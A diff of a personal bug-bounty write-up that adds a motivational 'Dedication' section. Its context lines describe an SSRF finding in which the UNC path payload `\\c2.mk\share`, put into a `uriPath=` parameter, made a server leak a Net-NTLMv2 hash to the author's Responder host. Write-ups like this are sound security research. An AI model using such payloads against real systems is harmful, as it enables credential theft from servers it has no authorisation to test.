@@ -21,7 +21,12 @@ The next point I want to touch on is creativity. As I have delved deeper into th
 An example of this I’ve encountered is SMB SSRF. Everyone knows the basic premise of SMB is to induce the web server to make an outbound HTTP request. I was looking at a program with a very tempting `uriPath=` parameter but was unable to achieve an HTTP request despite trying numerous bypasses. Out of curiosity I tried `uriPath=\\c2.mk\share` and immediate received the Net-NTLMv2 hash from the ASPX server on my VPS running Responder. This is not something I have commonly read about, but I proceeded to find it in six other parameters on this program. They were very clearly blocking outbound HTTP traffic but allowed outbound SMB traffic.  
 
 
-I may add future ramblings here in the future.
+## Dedication
+Bug bounty is no different than anything else in life. You have to work hard if you want to see progress and achieve positive results. There is no such thing as a free lunch, you will have to learn and understand web application attacks and exploits, then you will have to fight and compete with thousands of other bug hunters just get your first accepted bug. There is no substitute for hard work and hours spent practicing. Sit down and start today if you want to progress tomorrow.  
+
+
+<br>
+I may add future ramblings here in the future ¯\_(ツ)_/¯ 
 
 
 ## Statistic
